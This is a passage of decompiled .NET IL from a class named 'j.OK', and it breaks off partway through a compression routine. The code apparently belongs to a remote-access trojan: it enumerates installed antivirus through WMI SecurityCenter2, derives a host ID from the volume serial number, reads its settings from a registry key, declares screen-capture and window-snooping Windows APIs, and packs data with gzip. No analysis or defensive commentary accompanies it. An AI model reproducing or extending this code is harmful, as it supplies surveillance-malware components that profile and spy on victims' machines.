  .method private static pinvokeimpl("kernel32" as "GetVolumeInformationA" nomangle ansi lasterr winapi) 
          int32  GetVolumeInformation(string&  marshal( byvalstr) lpRootPathName,
                                      string&  marshal( byvalstr) lpVolumeNameBuffer,
                                      int32 nVolumeNameSize,
                                      int32& lpVolumeSerialNumber,
                                      int32& lpMaximumComponentLength,
                                      int32& lpFileSystemFlags,
                                      string&  marshal( byvalstr) lpFileSystemNameBuffer,
                                      int32 nFileSystemNameSize) cil managed preservesig
  {
  }
  .method public static pinvokeimpl("user32.dll" as "GetWindowTextA" nomangle ansi lasterr winapi) 
          int32  GetWindowText(native int hWnd,
                               string&  marshal( byvalstr) WinTitle,
                               int32 MaxLength) cil managed preservesig
  {
  }
  .method public static string  GetAntiVirus() cil managed
  {
    // Code size       326 (0x146)
    .maxstack  7
    .locals init (string V_0,
             int32 V_1,
             int32 V_2,
             int32 V_3,
             object V_4,
             object V_5,
             object[] V_6,
             bool[] V_7,
             object V_8,
             class [mscorlib]System.Collections.IEnumerator V_9,
             object V_10,
             int32 V_11,
             class [mscorlib]System.Exception V_12)
    .try
    {
      IL_0000:  ldc.i4.1
      IL_0001:  stloc.3
      IL_0002:  ldstr      "Select * From AntiVirusProduct"
      IL_0007:  stloc.s    V_4
      IL_0009:  ldc.i4.2
      IL_000a:  stloc.3
      IL_000b:  ldstr      "winmgmts:\\\\.\\root\\SecurityCenter2"
      IL_0010:  ldnull
      IL_0011:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::GetObject(string,
                                                                                                      string)
      IL_0016:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_001b:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0020:  stloc.s    V_5
      IL_0022:  ldc.i4.3
      IL_0023:  stloc.3
      IL_0024:  ldc.i4.1
      IL_0025:  newarr     [mscorlib]System.Object
      IL_002a:  dup
      IL_002b:  ldc.i4.0
      IL_002c:  ldloc.s    V_4
      IL_002e:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0033:  stelem.ref
      IL_0034:  stloc.s    V_6
      IL_0036:  ldc.i4.1
      IL_0037:  newarr     [mscorlib]System.Boolean
      IL_003c:  dup
      IL_003d:  ldc.i4.0
      IL_003e:  ldc.i4.1
      IL_003f:  stelem.i1
      IL_0040:  stloc.s    V_7
      IL_0042:  ldloc.s    V_7
      IL_0044:  ldc.i4.0
      IL_0045:  ldelem.u1
      IL_0046:  brfalse.s  IL_0058

      IL_0048:  ldloc.s    V_6
      IL_004a:  ldc.i4.0
      IL_004b:  ldelem.ref
      IL_004c:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0051:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0056:  stloc.s    V_4
      IL_0058:  ldloc.s    V_5
      IL_005a:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_005f:  ldnull
      IL_0060:  ldstr      "ExecQuery"
      IL_0065:  ldloc.s    V_6
      IL_0067:  ldnull
      IL_0068:  ldnull
      IL_0069:  ldloc.s    V_7
      IL_006b:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateGet(object,
                                                                                                                        class [mscorlib]System.Type,
                                                                                                                        string,
                                                                                                                        object[],
                                                                                                                        string[],
                                                                                                                        class [mscorlib]System.Type[],
                                                                                                                        bool[])
      IL_0070:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0075:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_007a:  stloc.s    V_8
      IL_007c:  ldc.i4.4
      IL_007d:  stloc.3
      IL_007e:  ldloc.s    V_8
      IL_0080:  castclass  [mscorlib]System.Collections.IEnumerable
      IL_0085:  callvirt   instance class [mscorlib]System.Collections.IEnumerator [mscorlib]System.Collections.IEnumerable::GetEnumerator()
      IL_008a:  stloc.s    V_9
      IL_008c:  br.s       IL_00ca

      IL_008e:  ldloc.s    V_9
      IL_0090:  callvirt   instance object [mscorlib]System.Collections.IEnumerator::get_Current()
      IL_0095:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_009a:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_009f:  stloc.s    V_10
      IL_00a1:  ldc.i4.1
      IL_00a2:  stloc.2
      IL_00a3:  ldc.i4.6
      IL_00a4:  stloc.3
      IL_00a5:  ldloc.s    V_10
      IL_00a7:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_00ac:  ldnull
      IL_00ad:  ldstr      "displayName"
      IL_00b2:  ldc.i4.0
      IL_00b3:  newarr     [mscorlib]System.Object
      IL_00b8:  ldnull
      IL_00b9:  ldnull
      IL_00ba:  ldnull
      IL_00bb:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateGet(object,
                                                                                                                        class [mscorlib]System.Type,
                                                                                                                        string,
                                                                                                                        object[],
                                                                                                                        string[],
                                                                                                                        class [mscorlib]System.Type[],
                                                                                                                        bool[])
      IL_00c0:  callvirt   instance string [mscorlib]System.Object::ToString()
      IL_00c5:  stloc.0
      IL_00c6:  leave.s    IL_0142

      IL_00c8:  ldc.i4.7
      IL_00c9:  stloc.3
      IL_00ca:  ldloc.s    V_9
      IL_00cc:  callvirt   instance bool [mscorlib]System.Collections.IEnumerator::MoveNext()
      IL_00d1:  brtrue.s   IL_008e

      IL_00d3:  ldloc.s    V_9
      IL_00d5:  isinst     [mscorlib]System.IDisposable
      IL_00da:  brfalse.s  IL_00e8

      IL_00dc:  ldloc.s    V_9
      IL_00de:  isinst     [mscorlib]System.IDisposable
      IL_00e3:  callvirt   instance void [mscorlib]System.IDisposable::Dispose()
      IL_00e8:  ldc.i4.8
      IL_00e9:  stloc.3
      IL_00ea:  ldstr      "No AV"
      IL_00ef:  stloc.0
      IL_00f0:  leave.s    IL_0142

      IL_00f2:  ldc.i4.0
      IL_00f3:  stloc.1
      IL_00f4:  ldloc.1
      IL_00f5:  ldc.i4.1
      IL_00f6:  add.ovf
      IL_00f7:  stloc.s    V_11
      IL_00f9:  ldloc.s    V_11
      IL_00fb:  ldc.i4.1
      IL_00fc:  sub
      IL_00fd:  switch     ( 
                            IL_0000,
                            IL_0009,
                            IL_0022,
                            IL_007c,
                            IL_00a1,
                            IL_00a3,
                            IL_00c8,
                            IL_00e8,
                            IL_0126)
      IL_0126:  leave.s    IL_0142

      IL_0128:  ldloc.3
      IL_0129:  stloc.1
      IL_012a:  ldloc.2
      IL_012b:  brfalse.s  IL_0131

      IL_012d:  ldloc.2
      IL_012e:  ldc.i4.1
      IL_012f:  beq.s      IL_00f2

      IL_0131:  leave.s    IL_0142

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0133:  dup
      IL_0134:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0139:  stloc.s    V_12
      IL_013b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0140:  leave.s    IL_0128

    }  // end handler
    IL_0142:  ldloc.1
    IL_0143:  pop
    IL_0144:  ldloc.0
    IL_0145:  ret
  } // end of method OK::GetAntiVirus

  .method public static pinvokeimpl("user32.dll" as "GetWindowTextLengthA" nomangle ansi lasterr winapi) 
          int32  GetWindowTextLength(int64 hwnd) cil managed preservesig
  {
  }
  .method public static object  GTV(string n,
                                    object 'ret') cil managed
  {
    // Code size       94 (0x5e)
    .maxstack  3
    .locals init (object V_0,
             class [mscorlib]System.Exception V_1)
    .try
    {
      IL_0000:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
      IL_0005:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_000a:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
      IL_000f:  ldstr      "Software\\"
      IL_0014:  ldsfld     string j.OK::RG
      IL_0019:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_001e:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string)
      IL_0023:  ldarg.0
      IL_0024:  ldarg.1
      IL_0025:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_002a:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_002f:  callvirt   instance object [mscorlib]Microsoft.Win32.RegistryKey::GetValue(string,
                                                                                           object)
      IL_0034:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0039:  stloc.0
      IL_003a:  leave.s    IL_005c

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_003c:  dup
      IL_003d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0042:  stloc.1
      IL_0043:  ldloc.1
      IL_0044:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0049:  ldarg.1
      IL_004a:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_004f:  stloc.0
      IL_0050:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0055:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_005a:  leave.s    IL_005c

    }  // end handler
    IL_005c:  ldloc.0
    IL_005d:  ret
  } // end of method OK::GTV

  .method public static string  HWD() cil managed
  {
    // Code size       96 (0x60)
    .maxstack  8
    .locals init (string V_0,
             int32 V_1,
             string V_2,
             int32 V_3,
             int32 V_4,
             string V_5,
             string V_6,
             class [mscorlib]System.Exception V_7)
    .try
    {
      IL_0000:  ldnull
      IL_0001:  stloc.2
      IL_0002:  ldc.i4.0
      IL_0003:  stloc.3
      IL_0004:  ldc.i4.0
      IL_0005:  stloc.s    V_4
      IL_0007:  ldnull
      IL_0008:  stloc.s    V_5
      IL_000a:  ldstr      "SystemDrive"
      IL_000f:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Environ(string)
      IL_0014:  ldstr      "\\"
      IL_0019:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_001e:  stloc.s    V_6
      IL_0020:  ldloca.s   V_6
      IL_0022:  ldloca.s   V_2
      IL_0024:  ldc.i4.0
      IL_0025:  ldloca.s   V_1
      IL_0027:  ldloca.s   V_3
      IL_0029:  ldloca.s   V_4
      IL_002b:  ldloca.s   V_5
      IL_002d:  ldc.i4.0
      IL_002e:  call       int32 j.OK::GetVolumeInformation(string&,
                                                            string&,
                                                            int32,
                                                            int32&,
                                                            int32&,
                                                            int32&,
                                                            string&,
                                                            int32)
      IL_0033:  pop
      IL_0034:  ldloc.1
      IL_0035:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Conversion::Hex(int32)
      IL_003a:  stloc.0
      IL_003b:  leave.s    IL_005e

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_003d:  dup
      IL_003e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0043:  stloc.s    V_7
      IL_0045:  ldloc.s    V_7
      IL_0047:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_004c:  ldstr      "ERR"
      IL_0051:  stloc.0
      IL_0052:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0057:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_005c:  leave.s    IL_005e

    }  // end handler
    IL_005e:  ldloc.0
    IL_005f:  ret
  } // end of method OK::HWD

  .method public static pinvokeimpl("KERNEL32.DLL" winapi) 
          void  Beep(int32 freq,
                     int32 dur) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("user32.dll" autochar lasterr winapi) 
          native int  FindWindow(string lpClassName,
                                 string lpWindowName) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("user32.dll" autochar lasterr winapi) 
          bool  ShowWindow(native int hwnd,
                           int32 nCmdShow) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("winmm.dll" winapi) 
          int32  mciSendString(string command,
                               string buffer,
                               int32 bufferSize,
                               native int hwndCallback) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("user32.dll" winapi) 
          bool  marshal( bool)  ReleaseDC(native int hWnd,
                                          native int hDC) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("gdi32.dll" winapi) 
          native int  CreateSolidBrush(uint32 crColor) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("gdi32.dll" winapi) 
          bool  PatBlt(native int hdc,
                       int32 nXLeft,
                       int32 nYLeft,
                       int32 nWidth,
                       int32 nHeight,
                       valuetype j.OK/TernaryRasterOperations dwRop) cil managed preservesig
  {
  }
  .method public static pinvokeimpl("gdi32.dll" nomangle unicode lasterr stdcall) 
          object  BitBlt(native int hdcDest,
                         int32 nXDest,
                         int32 nYDest,
                         int32 nWidth,
                         int32 nHeight,
                         native int hdcSrc,
                         int32 nXSrc,
                         int32 nYSrc,
                         int32 dwRop) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("gdi32.dll" winapi) 
          bool  StretchBlt(native int hdcDest,
                           int32 nXOriginDest,
                           int32 nYOriginDest,
                           int32 nWidthDest,
                           int32 nHeightDest,
                           native int hdcSrc,
                           int32 nXOriginSrc,
                           int32 nYOriginSrc,
                           int32 nWidthSrc,
                           int32 nHeightSrc,
                           valuetype j.OK/TernaryRasterOperations dwRop) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("user32.dll" winapi) 
          native int  GetDesktopWindow() cil managed preservesig
  {
  }
  .method private static pinvokeimpl("user32.dll" winapi) 
          native int  GetWindowDC(native int hWnd) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("gdi32" winapi) 
          native int  SelectObject(native int hdc,
                                   native int hgdiobj) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("gdi32" winapi) 
          bool  DeleteObject(native int objectHandle) cil managed preservesig
  {
  }
  .method public static uint8[]  ZIP(uint8[] B,
                                     bool& CM) cil managed
  {
    // Code size       774 (0x306)
    .maxstack  13
    .locals init (uint8[] V_0,
             object V_1,
             object V_2,
             uint8[] V_3,
             object[] V_4,
             bool[] V_5,
             object V_6,
             object V_7,
             uint8[] V_8,
             int32 V_9,
             uint8[] V_10)
    IL_0000:  ldarg.1
    IL_0001:  ldind.u1
    IL_0002:  brfalse    IL_0154

    IL_0007:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
    IL_000c:  stloc.1
    IL_000d:  ldloc.1
    IL_000e:  castclass  [mscorlib]System.IO.Stream
    IL_0013:  ldc.i4.1
    IL_0014:  ldc.i4.1
    IL_0015:  newobj     instance void [System]System.IO.Compression.GZipStream::.ctor(class [mscorlib]System.IO.Stream,
                                                                                       valuetype [System]System.IO.Compression.CompressionMode,
                                                                                       bool)
    IL_001a:  stloc.2
    IL_001b:  ldloc.2
    IL_001c:  ldnull
    IL_001d:  ldstr      "Write"
    IL_0022:  ldc.i4.3
    IL_0023:  newarr     [mscorlib]System.Object
    IL_0028:  dup
    IL_0029:  ldc.i4.0
    IL_002a:  ldarg.0
    IL_002b:  stelem.ref
    IL_002c:  dup
    IL_002d:  ldc.i4.1
    IL_002e:  ldc.i4.0
    IL_002f:  box        [mscorlib]System.Int32
    IL_0034:  stelem.ref
    IL_0035:  dup
    IL_0036:  ldc.i4.2
    IL_0037:  ldarg.0
    IL_0038:  ldlen
    IL_0039:  conv.i4
    IL_003a:  box        [mscorlib]System.Int32
    IL_003f:  stelem.ref
    IL_0040:  dup
    IL_0041:  stloc.s    V_4
    IL_0043:  ldnull
    IL_0044:  ldnull
    IL_0045:  ldc.i4.3
    IL_0046:  newarr     [mscorlib]System.Boolean
    IL_004b:  dup
    IL_004c:  ldc.i4.0
    IL_004d:  ldc.i4.1
    IL_004e:  stelem.i1
    IL_004f:  dup
    IL_0050:  stloc.s    V_5
    IL_0052:  ldc.i4.1
    IL_0053:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateCall(object,
                                                                                                                       class [mscorlib]System.Type,
                                                                                                                       string,
                                                                                                                       object[],
                                                                                                                       string[],
                                                                                                                       class [mscorlib]System.Type[],
                                                                                                                       bool[],
                                                                                                                       bool)
    IL_0058:  pop
    IL_0059:  ldloc.s    V_5
    IL_005b:  ldc.i4.0
    IL_005c:  ldelem.u1
    IL_005d:  brfalse.s  IL_007e

    IL_005f:  ldloc.s    V_4
    IL_0061:  ldc.i4.0
    IL_0062:  ldelem.ref
    IL_0063:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
    IL_0068:  ldtoken    uint8[]
    IL_006d:  call       class [mscorlib]System.Type [mscorlib]System.Type::GetTypeFromHandle(valuetype [mscorlib]System.RuntimeTypeHandle)
    IL_0072:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ChangeType(object,
                                                                                                                      class [mscorlib]System.Type)
    IL_0077:  castclass  uint8[]
    IL_007c:  starg.s    B
    IL_007e:  ldloc.2
    IL_007f:  ldnull
    IL_0080:  ldstr      "Dispose"
    IL_0085:  ldc.i4.0
    IL_0086:  newarr     [mscorlib]System.Object
    IL_008b:  ldnull
    IL_008c:  ldnull
    IL_008d:  ldnull
    IL_008e:  ldc.i4.1
    IL_008f:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateCall(object,
                                                                                                                       class [mscorlib]System.Type,
                                                                                                                       string,
                                                                                                                       object[],
                                                                                                                       string[],
                                                                                                                       class [mscorlib]System.Type[],
                                                                                                                       bool[],
                                                                                                                       bool)
    IL_0094:  pop
    IL_0095:  ldloc.1
    IL_0096:  ldnull
    IL_0097:  ldstr      "Position"
    IL_009c:  ldc.i4.1
    IL_009d:  newarr     [mscorlib]System.Object
    IL_00a2:  dup
    IL_00a3:  ldc.i4.0
    IL_00a4:  ldc.i4.0
    IL_00a5:  box        [mscorlib]System.Int32
    IL_00aa:  stelem.ref
    IL_00ab:  ldnull
    IL_00ac:  ldnull
    IL_00ad:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateSet(object,
                                                                                                                    class [mscorlib]System.Type,
                                                                                                                    string,
                                                                                                                    object[],
                                                                                                                    string[],
                                                                                                                    class [mscorlib]System.Type[])
    IL_00b2:  ldloc.1
    IL_00b3:  ldnull
    IL_00b4:  ldstr      "Length"
    IL_00b9:  ldc.i4.0
    IL_00ba:  newarr     [mscorlib]System.Object
    IL_00bf:  ldnull
    IL_00c0:  ldnull
    IL_00c1:  ldnull
    IL_00c2:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateGet(object,
                                                                                                                      class [mscorlib]System.Type,
                                                                                                                      string,
                                                                                                                      object[],
                                                                                                                      string[],
                                                                                                                      class [mscorlib]System.Type[],
                                                                                                                      bool[])
    IL_00c7:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(object)
    IL_00cc:  ldc.i4.1
    IL_00cd:  add.ovf
    IL_00ce:  newarr     [mscorlib]System.Byte
    IL_00d3:  stloc.3
    IL_00d4:  ldloc.1
    IL_00d5:  ldnull
    IL_00d6:  ldstr      "Read"
    IL_00db:  ldc.i4.3
    IL_00dc:  newarr     [mscorlib]System.Object
    IL_00e1:  dup
    IL_00e2:  ldc.i4.0
    IL_00e3:  ldloc.3
    IL_00e4:  stelem.ref
    IL_00e5:  dup
    IL_00e6:  ldc.i4.1
    IL_00e7:  ldc.i4.0
    IL_00e8:  box        [mscorlib]System.Int32
    IL_00ed:  stelem.ref
    IL_00ee:  dup
    IL_00ef:  ldc.i4.2
    IL_00f0:  ldloc.3
    IL_00f1:  ldlen
    IL_00f2:  conv.i4
    IL_00f3:  box        [mscorlib]System.Int32
    IL_00f8:  stelem.ref
    IL_00f9:  dup
    IL_00fa:  stloc.s    V_4
    IL_00fc:  ldnull
    IL_00fd:  ldnull
    IL_00fe:  ldc.i4.3
    IL_00ff:  newarr     [mscorlib]System.Boolean
    IL_0104:  dup
    IL_0105:  ldc.i4.0
    IL_0106:  ldc.i4.1
    IL_0107:  stelem.i1
    IL_0108:  dup
    IL_0109:  stloc.s    V_5
    IL_010b:  ldc.i4.1
    IL_010c:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateCall(object,
                                                                                                                       class [mscorlib]System.Type,
                                                                                                                       string,
                                                                                                                       object[],
                                                                                                                       string[],
                                                                                                                       class [mscorlib]System.Type[],
                                                                                                                       bool[],
                                                                                                                       bool)
    IL_0111:  pop
    IL_0112:  ldloc.s    V_5
    IL_0114:  ldc.i4.0
    IL_0115:  ldelem.u1
    IL_0116:  brfalse.s  IL_0136

    IL_0118:  ldloc.s    V_4
    IL_011a:  ldc.i4.0
    IL_011b:  ldelem.ref
    IL_011c:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
    IL_0121:  ldtoken    uint8[]
    IL_0126:  call       class [mscorlib]System.Type [mscorlib]System.Type::GetTypeFromHandle(valuetype [mscorlib]System.RuntimeTypeHandle)
    IL_012b:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ChangeType(object,
                                                                                                                      class [mscorlib]System.Type)
    IL_0130:  castclass  uint8[]
    IL_0135:  stloc.3
    IL_0136:  ldloc.1
    IL_0137:  ldnull
    IL_0138:  ldstr      "Dispose"
    IL_013d:  ldc.i4.0
    IL_013e:  newarr     [mscorlib]System.Object
    IL_0143:  ldnull
    IL_0144:  ldnull
    IL_0145:  ldnull
    IL_0146:  ldc.i4.1
    IL_0147:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateCall(object,
                                                                                                                       class [mscorlib]System.Type,
                                                                                                                       string,
                                                                                                                       object[],
                                                                                                                       string[],
                                                                                                                       class [mscorlib]System.Type[],
                                                                                                                       bool[],
                                                                                                                       bool)
    IL_014c:  pop
    IL_014d:  ldloc.3
    IL_014e:  stloc.0
    IL_014f:  br         IL_0304

    IL_0154:  ldarg.0
    IL_0155:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor(uint8[])
    IL_015a:  stloc.s    V_6
    IL_015c:  ldloc.s    V_6
    IL_015e:  castclass  [mscorlib]System.IO.Stream
    IL_0163:  ldc.i4.0
    IL_0164:  newobj     instance void [System]System.IO.Compression.GZipStream::.ctor(class [mscorlib]System.IO.Stream,
                                                                                       valuetype [System]System.IO.Compression.CompressionMode)
    IL_0169:  stloc.s    V_7
    IL_016b:  ldc.i4.4
    IL_016c:  newarr     [mscorlib]System.Byte
    IL_0171:  stloc.s    V_8
    IL_0173:  ldloc.s    V_6
    IL_0175:  ldnull
    IL_0176:  ldstr      "Position"
    IL_017b:  ldc.i4.1
    IL_017c:  newarr     [mscorlib]System.Object
    IL_0181:  dup
    IL_0182:  ldc.i4.0
    IL_0183:  ldloc.s    V_6
    IL_0185:  ldnull
    IL_0186:  ldstr      "Length"
    IL_018b:  ldc.i4.0
    IL_018c:  newarr     [mscorlib]System.Object
    IL_0191:  ldnull
    IL_0192:  ldnull
    IL_0193:  ldnull
    IL_0194:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateGet(object,
                                                                                                                      class [mscorlib]System.Type,
                                                                                                                      string,
                                                                                                                      object[],
                                                                                                                      string[],
                                                                                                                      class [mscorlib]System.Type[],
                                                                                                                      bool[])
    IL_0199:  ldc.i4.5
    IL_019a:  box        [mscorlib]System.Int32
    IL_019f:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::SubtractObject(object,
                                                                                                                        object)
    IL_01a4:  stelem.ref
    IL_01a5:  ldnull
    IL_01a6:  ldnull
    IL_01a7:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateSet(object,
                                                                                                                    class [mscorlib]System.Type,
                                                                                                                    string,
                                                                                                                    object[],
                                                                                                                    string[],
                                                                                                                    class [mscorlib]System.Type[])
    IL_01ac:  ldloc.s    V_6
    IL_01ae:  ldnull
    IL_01af:  ldstr      "Read"
    IL_01b4:  ldc.i4.3
    IL_01b5:  newarr     [mscorlib]System.Object
    IL_01ba:  dup
    IL_01bb:  ldc.i4.0
    IL_01bc:  ldloc.s    V_8
    IL_01be:  stelem.ref
    IL_01bf:  dup
    IL_01c0:  ldc.i4.1
    IL_01c1:  ldc.i4.0
    IL_01c2:  box        [mscorlib]System.Int32
    IL_01c7:  stelem.ref
    IL_01c8:  dup
    IL_01c9:  ldc.i4.2
    IL_01ca:  ldc.i4.4
    IL_01cb:  box        [mscorlib]System.Int32
    IL_01d0:  stelem.ref
    IL_01d1:  dup
    IL_01d2:  stloc.s    V_4
    IL_01d4:  ldnull
    IL_01d5:  ldnull
    IL_01d6:  ldc.i4.3
    IL_01d7:  newarr     [mscorlib]System.Boolean
    IL_01dc:  dup
    IL_01dd:  ldc.i4.0
    IL_01de:  ldc.i4.1
    IL_01df:  stelem.i1
    IL_01e0:  dup
    IL_01e1:  stloc.s    V_5
    IL_01e3:  ldc.i4.1
    IL_01e4:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateCall(object,
                                                                                                                       class [mscorlib]System.Type,
                                                                                                                       string,
                                                                                                                       object[],
                                                                                                                       string[],
                                                                                                                       class [mscorlib]System.Type[],
                                                                                                                       bool[],
                                                                                                                       bool)
    IL_01e9:  pop
    IL_01ea:  ldloc.s    V_5
    IL_01ec:  ldc.i4.0
    IL_01ed:  ldelem.u1
    IL_01ee:  brfalse.s  IL_020f

    IL_01f0:  ldloc.s    V_4
    IL_01f2:  ldc.i4.0
    IL_01f3:  ldelem.ref
    IL_01f4:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
    IL_01f9:  ldtoken    uint8[]
    IL_01fe:  call       class [mscorlib]System.Type [mscorlib]System.Type::GetTypeFromHandle(valuetype [mscorlib]System.RuntimeTypeHandle)
    IL_0203:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ChangeType(object,
                                                                                                                      class [mscorlib]System.Type)
    IL_0208:  castclass  uint8[]
    IL_020d:  stloc.s    V_8
    IL_020f:  ldloc.s    V_8
    IL_0211:  ldc.i4.0
    IL_0212:  call       int32 [mscorlib]System.BitConverter::ToInt32(uint8[],
                                                                      int32)
    IL_0217:  stloc.s    V_9
    IL_0219:  ldloc.s    V_6
    IL_021b:  ldnull
    IL_021c:  ldstr      "Position"
    IL_0221:  ldc.i4.1
    IL_0222:  newarr     [mscorlib]System.Object
    IL_0227:  dup
    IL_0228:  ldc.i4.0
    IL_0229:  ldc.i4.0
    IL_022a:  box        [mscorlib]System.Int32
    IL_022f:  stelem.ref
    IL_0230:  ldnull
    IL_0231:  ldnull
    IL_0232:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateSet(object,
                                                                                                                    class [mscorlib]System.Type,
                                                                                                                    string,
                                                                                                                    object[],
                                                                                                                    string[],
                                                                                                                    class [mscorlib]System.Type[])
    IL_0237:  ldloc.s    V_9
    IL_0239:  ldc.i4.1
    IL_023a:  sub.ovf
    IL_023b:  ldc.i4.1
    IL_023c:  add.ovf
    IL_023d:  newarr     [mscorlib]System.Byte
    IL_0242:  stloc.s    V_10
    IL_0244:  ldloc.s    V_7
    IL_0246:  ldnull
    IL_0247:  ldstr      "Read"
    IL_024c:  ldc.i4.3
    IL_024d:  newarr     [mscorlib]System.Object
    IL_0252:  dup
    IL_0253:  ldc.i4.0
    IL_0254:  ldloc.s    V_10
    IL_0256:  stelem.ref
    IL_0257:  dup
    IL_0258:  ldc.i4.1
    IL_0259:  ldc.i4.0
    IL_025a:  box        [mscorlib]System.Int32
    IL_025f:  stelem.ref
    IL_0260:  dup
    IL_0261:  ldc.i4.2
    IL_0262:  ldloc.s    V_9
    IL_0264:  box        [mscorlib]System.Int32
    IL_0269:  stelem.ref
    IL_026a:  dup
    IL_026b:  stloc.s    V_4
    IL_026d:  ldnull
    IL_026e:  ldnull
    IL_026f:  ldc.i4.3
    IL_0270:  newarr     [mscorlib]System.Boolean
    IL_0275:  dup
    IL_0276:  ldc.i4.0
    IL_0277:  ldc.i4.1
    IL_0278:  stelem.i1
    IL_0279:  dup
    IL_027a:  ldc.i4.2
    IL_027b:  ldc.i4.1
    IL_027c:  stelem.i1
    IL_027d:  dup
    IL_027e:  stloc.s    V_5
